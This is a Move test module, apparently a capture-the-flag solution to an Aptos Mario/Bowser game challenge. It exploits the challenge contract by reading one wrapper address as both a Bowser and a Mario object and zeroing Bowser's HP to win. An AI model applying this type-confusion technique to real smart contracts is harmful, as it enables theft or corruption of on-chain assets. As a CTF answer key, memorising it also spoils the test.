module challenge::solution5 {
    use aptos_framework::signer;
    use aptos_framework::object::{Object, ExtendRef, Self};
    use challenge::router2::{Self, Config, Bowser, Mario};

    #[test(account = @1338, challenger = @challenger, challenge = @challenge, aptos_framework = @0x1)]
    public entry fun solve(account: &signer, challenger: &signer,challenge :&signer) {
        router2::initialize(challenger);
        let mario_addr = router2::start_game(account);
        let mario_obj = object::address_to_object<Mario>(mario_addr);
        for (i in 0..127) {
            router2::train_mario(account, mario_obj);
        };

        router2::battle(account, mario_obj);

        let wrapper_addr = router2::get_wrapper();
        let browser_obj = object::address_to_object<Bowser>(wrapper_addr);
        router2::set_hp(account, browser_obj, 0);

        let new_mario_obj = object::address_to_object<Mario>(wrapper_addr);
        router2::train_mario(account, new_mario_obj);
        router2::battle(account, mario_obj);
        router2::is_solved(account);
    }
}
